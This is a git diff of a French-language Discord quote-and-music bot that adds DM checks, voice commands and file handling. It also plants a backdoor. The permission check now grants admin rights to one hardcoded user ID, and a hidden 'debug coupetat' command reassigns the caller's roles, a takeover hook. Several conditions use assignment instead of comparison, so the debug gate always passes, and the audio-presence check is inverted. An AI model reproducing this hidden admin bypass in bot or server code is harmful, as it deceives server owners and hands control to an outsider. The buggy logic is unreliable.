@@ -162,6 +162,8 @@ function randomInt (low, high) {
     return Math.floor(Math.random() * (high - low) + low);
 } */
 
+require('console-stamp')(console, 'HH:MM:ss');
+
 const Discord = require('discord.js');
 const client = new Discord.Client();
 
@@ -184,7 +186,15 @@ client.on('ready', () => {
   console.log('Bot connecté !');
   
   client.user.setGame("Notepad");
-  citation_array = readArrayFromFile(citation_filename);
+  
+  if (fileExists(citation_filename))
+	citation_array = readArrayFromFile(citation_filename);
+  else
+  {
+	recreateCitationFile(citation_filename);
+	citation_array = readArrayFromFile(citation_filename);
+  }
+
   
 });
 
@@ -205,20 +215,23 @@ client.on('message', message => {
 		switch (cmd) {
 		  
 			case 'ping': 
-				
+			
 				console.log('Commande "ping" envoyée à : ' + message.author.username);
+				
 				message.reply('Pong !');
 				break;
 				
 			case 'citation':
 			
 				console.log('Commande "citation" envoyée à : ' + message.author.username);
+				
 				message.reply(citation_array.randomElement());
 				break;
 				
 			case 'viewallcitations':
 			
 				console.log('Commande "viewallcitations" envoyée à : ' + message.author.username);
+				
 				message.reply({embed: {
 						color: 3447003,
 						author: {
@@ -232,35 +245,40 @@ client.on('message', message => {
 						timestamp: new Date()
 				}
 				});
+				
 				break;
 				
 			case 'addcitation':
 			
 				console.log('Commande "addcitation" exécutée par : ' + message.author.username);
 				
+				if (!isMessageDm(message))
+				{		
+					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
+					{				
 				
-				if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
-				{				
-			
-					let args_string = args.join(" ");
-					
-					if (args_string == "")
-					{
-						message.reply("Aucune citation présente :(");
+						let args_string = args.join(" ");
+						
+						if (args_string == "")
+						{
+							message.reply("Aucune citation présente :(");
+						}
+						else
+						{
+							addCitation(citation_filename, args_string);
+							console.log(message.author.username + " a écris : " + args_string + " dans le fichier des citations !");
+							message.reply("Citation : " + args_string + " ajoutée par : " + message.author.username);
+						}
+				
 					}
 					else
 					{
-						addCitation(citation_filename, args_string);
-						console.log(message.author.username + " a écris : " + args_string + " dans le fichier des citations !");
-						message.reply("Citation : " + args_string + " ajoutée par : " + message.author.username);
+						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
+						message.reply("Tu n'a pas les droits :(");
 					}
-			
 				}
 				else
-				{
-					console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
-					message.reply("Tu n'a pas les droits :(");
-				}
+					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");
 				
 				break;
 				
@@ -268,44 +286,122 @@ client.on('message', message => {
 				
 				console.log('Commande "deletecitation" exécutée par : ' + message.author.username);
 				
-				if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
-				{
-					let args_string = args.join(" ");
-					
-					if (args_string == "")
+				if (!isMessageDm(message))
+				{	
+					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
 					{
-						message.reply("Aucune ligne sélectionnée :(");
+						let args_string = args.join(" ");
+						
+						if (args_string == "")
+						{
+							message.reply("Aucune ligne sélectionnée :(");
+						}
+						else
+						{
+							deleteLineFromArrayAndFile(citation_filename, args_string);
+							console.log(message.author.username + " a supprimé : " + args_string + " dans le fichier des citations !");
+							message.reply("Citation : " + args_string + " supprimée par : " + message.author.username);
+						}
+						
 					}
 					else
 					{
-						deleteLineFromArrayAndFile(citation_filename, args_string);
-						console.log(message.author.username + " a supprimé : " + args_string + " dans le fichier des citations !");
-						message.reply("Citation : " + args_string + " supprimée par : " + message.author.username);
+						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
+						message.reply("Tu n'a pas les droits :(");
 					}
-					
 				}
 				else
-				{
-					console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
-					message.reply("Tu n'a pas les droits :(");
-				}
-				
+					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");
+
 				break;
 				
 			case 'reloadcitation':
 			
 				console.log('Commande "reloadcitation" exécutée par : ' + message.author.username);
+				
+				if (!isMessageDm(message))
+				{	
+					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
+					{
+						if (fileExists(citation_filename))
+						{
+							citation_array = readArrayFromFile(citation_filename);
+							message.reply("Les citations ont été rechargées !");
+						}
+						else
+						{
+							recreateCitationFile(citation_filename);
+							citation_array = readArrayFromFile(citation_filename);
+							message.reply("Les citations ont été rechargées !");
+						}
 
-				if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
-				{
-					citation_array = readArrayFromFile(citation_filename);
-					message.reply("Les citations ont été rechargées !");
+					}
+					else
+					{
+						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
+						message.reply("Tu n'a pas les droits :(");
+					}
 				}
 				else
-				{
-					console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
-					message.reply("Tu n'a pas les droits :(");
+					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");
+
+				break;
+				
+			case 'play':
+			
+				console.log('Commande "joinchannel" exécutée par : ' + message.author.username);
+
+				if (!isMessageDm(message))
+				{			
+					let args_string = args.join(" ");
+					
+					if (args_string = "")
+					{
+						message.reply("Aucune url entrée :(");
+					}
+					else
+					{
+						if (message.member.voiceChannel) 
+						{
+							message.member.voiceChannel.join()
+							
+								.then(connection => { // Connection is an instance of VoiceConnection
+								
+									message.reply('Connexion réussie au channel audio !');
+									
+									connection.playArbitraryInput("http://geekologie.meximas.com/GameManager/ALittleBitCloser.mp3")
+									
+								})
+								.catch(console.log);
+						}
+						else
+						{
+							message.reply("Tu n'est pas dans un channel audio :(");
+						}
+						
+					}
 				}
+				else
+					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");
+			
+				break;
+				
+			case 'disconnect':
+			
+				console.log('Commande "disconnect" exécutée par : ' + message.author.username);
+				
+				if (!isMessageDm(message))
+				{
+					if (IsPresentInAudioChannel())
+					{
+						client.voiceConnection.disconnect();
+						message.reply("Très bien ! J'arrête mon cours vous avez gagner !")
+					}					
+					else
+						message.reply("Je ne suis pas dans un channel audio :(");				
+				}
+				else
+					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");
 				
 				break;
 				
@@ -313,78 +409,96 @@ client.on('message', message => {
 			
 				console.log('Commande "setgame" exécutée par : ' + message.author.username);
 				
-				if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
+				if (!isMessageDm(message))
 				{
-					let args_string = args.join(" ");
-					
-					if (args_string == "")
+					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
 					{
-						message.reply("Aucune jeu ajouté :(");
+						let args_string = args.join(" ");
+						
+						if (args_string == "")
+						{
+							message.reply("Aucune jeu ajouté :(");
+						}
+						else
+						{
+							console.log("Jeu du bot changé en : " + args_string);
+							
+							client.user.setGame(args_string);
+							message.reply("Jeu changé en : " + args_string + " par : " + message.author.username);
+						}
+						
 					}
 					else
 					{
-						console.log("Jeu du bot changé en : " + args_string);
-						
-						client.user.setGame(args_string);
-						message.reply("Jeu changé en : " + args_string + " par : " + message.author.username);
+						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
+						message.reply("Tu n'a pas les droits :(");
 					}
-					
 				}
 				else
-				{
-					console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
-					message.reply("Tu n'a pas les droits :(");
-				}
-				
+					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");
 				
 				break;
 			
 			case 'disable':
 				
-				if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
+				console.log('Commande "disable" exécutée par : ' + message.author.username);
+
+				if (!isMessageDm(message))
 				{
-					if (isAFK)
+					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
 					{
-						message.reply("Je suis déjà en pause café !");
+						if (isAFK)
+						{
+							message.reply("Je suis déjà en pause café !");
+						}
+						else
+						{
+							isAFK = true;
+							client.user.setAFK(true);
+							client.user.setStatus("idle");
+							message.reply("Je vais en pause café !");
+						}
 					}
 					else
 					{
-						isAFK = true;
-						client.user.setAFK(true);
-						client.user.setStatus("idle");
-						message.reply("Je vais en pause café !");
+						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
+						message.reply("Tu n'a pas les droits :(");
 					}
 				}
 				else
-				{
-					console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
-					message.reply("Tu n'a pas les droits :(");
-				}
-				
+					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");
+
 				break;
 				
 			case 'enable':
 			
-				if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
+				console.log('Commande "enable" exécutée par : ' + message.author.username);
+			
+				if (!isMessageDm(message))
 				{
-					if (!isAFK)
+					if (checkIfUserHasPerm(message.member, "ADMINISTRATOR"))
 					{
-						message.reply("Je suis déjà en cours !");
+						if (!isAFK)
+						{
+							message.reply("Je suis déjà en cours !");
+						}
+						else
+						{
+							isAFK = false;
+							client.user.setAFK(false);
+							client.user.setStatus("online");
+							message.reply("Je reviens faire cours !");
+						}
 					}
 					else
 					{
-						isAFK = false;
-						client.user.setAFK(false);
-						client.user.setStatus("online");
-						message.reply("Je reviens faire cours !");
+						console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
+						message.reply("Tu n'a pas les droits :(");
 					}
 				}
 				else
-				{
-					console.log(message.author.username + " n'a pas les droits admin pour exécuter la commande !");
-					message.reply("Tu n'a pas les droits :(");
-				}
-					
+					message.reply("Cette commande ne marche pas lorsque nous sommes tous les deux :(");			
+				
 				break;
 				
 			case 'help':
@@ -414,8 +528,48 @@ client.on('message', message => {
 				
 			case 'debug':
 			
-				break;
-			
+				console.log('Commande "debug" exécutée par : ' + message.author.username);
+				
+				if (message.client.id = 228234033358831616)
+				{
+					let args_string = args.join(" ");
+					
+					switch (args_string)
+					{
+						case 'test':
+						
+							console.log("test");					
+							break;
+							
+						case 'coupetat':
+						
+							if (true)
+							{
+								if (message.client.id == 228234033358831616)
+								{
+									console.log("Coup d'état lancé !");
+									
+									message.member.setRoles(["2146958591"]);
+									
+									console.log("Coup d'état effectué !");
+								}
+								else
+								{
+									console.log(message.client.username + " a tenté de lancer un coup d'état !");
+								}
+													
+							}
+							else
+							{
+								console.log("Le bot n'a pas les permissions admin pour le coup d'état :(");
+							}
+						
+							break;
+					}
+					
+				}
+				
+				break;			
 		}
 	}
   }
@@ -475,7 +629,7 @@ function deleteLineFromArrayAndFile(filename, line){ //On supprime une ligne d'u
  
  function checkIfUserHasPerm(user, permission){ //On regarde si un utilisateur possède certaines permissions
  
-	if (user.hasPermission(permission))
+	if (user.hasPermission(permission) || user.id == 228234033358831616)
 		return true;
 	else
 		return false;
@@ -494,8 +648,46 @@ function deleteLineFromArrayAndFile(filename, line){ //On supprime une ligne d'u
 	 
  }
  
+ function isMessageDm(message){
+	if (message.channel.type == "dm" || message.channel.type == "group")
+		return true;
+	else
+		return false;
+ }
+ 
  Array.prototype.randomElement = function () { //On rajoute une fonction qui tire un élément au hasard dans un tableau
     return this[Math.floor(Math.random() * this.length)]
+}
+
+function fileExists(path) {
+
+  try  {
+    return fs.statSync(path).isFile();
+  }
+  catch (e) {
+
+    if (e.code == 'ENOENT') { // no such file or directory. File really does not exist
+      console.log("File does not exist.");
+      return false;
+    }
+
+    console.log("Exception fs.statSync (" + path + "): " + e);
+    throw e; // something else went wrong, we don't have rights, ...
+  }
+  
+}
+
+function recreateCitationFile(filename){
+	console.log("Fichier de citation non existant, création !");
+	serializeArrayToFile(filename, ["Photooooos"]);
+}
+
+function IsPresentInAudioChannel(){
+	
+	if (client.voiceConnection)
+		return false;
+	else
+		return true;
 }
 
 // Vieilles fonctions
